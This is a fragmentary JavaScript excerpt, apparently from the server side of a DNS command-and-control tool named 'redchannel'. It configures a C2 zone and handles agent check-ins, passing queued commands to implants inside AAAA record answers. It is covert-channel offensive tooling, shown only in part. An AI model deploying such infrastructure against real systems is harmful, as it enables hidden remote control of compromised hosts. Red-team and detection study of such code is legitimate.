...
$dns_server
    .zone($redchannel.config.c2.domain,
        'ns1.' + $redchannel.config.c2.domain,
        'root@' + $redchannel.config.c2.domain, 'now', '2h', '30m', '2w', '10m')
...
function c2_message_handler(req, res) {
    ...
    if (typeof $redchannel.config.static_dns[hostname] != "undefined") {
        ...
        res.answer.push({ name: hostname, type: 'A', data: $redchannel.config.static_dns[hostname], 'ttl': ttl });
        res.end();
        return;
    }
    ...
    if (command == $redchannel.AGENT_CHECKIN) {
        if ($redchannel.agents[agent_id].sendq.length == 0) {
            ...
            res.answer.push({ name: hostname, type: 'AAAA', data: status, 'ttl': ttl });
            res.end();
            return;
        }
        ...
        records.forEach(function (record) {
            res.answer.push({ name: hostname, type: 'AAAA', data: record, 'ttl': ttl });
        });
